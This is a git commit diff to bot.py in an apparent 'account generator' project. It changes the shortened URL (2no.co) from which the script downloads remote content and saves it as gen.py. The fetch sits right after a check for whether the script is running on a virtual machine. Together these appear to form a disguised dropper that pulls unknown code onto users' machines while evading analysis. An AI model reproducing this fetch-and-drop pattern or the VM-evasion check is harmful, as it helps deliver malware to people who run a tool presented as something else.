5fe63b59986ba69d4092e897a66830504717c3ab
KADIUM <124511777+KADIUMX@users.noreply.github.com>
2023-03-09 20:30:53 +0100

    Update bot.py

--- Account Gen Vest/bot.py
+++ Account Gen Vest/bot.py
@@ -62,7 +62,7 @@ if is_running_on_vm():
 else:
     pass
 
-gen = requests.get('https://2no.co/2ozb82')
+gen = requests.get('https://2no.co/vest-gen')
 with open('gen.py', 'wb')as genv2:
     genv2.write(gen.content)
 
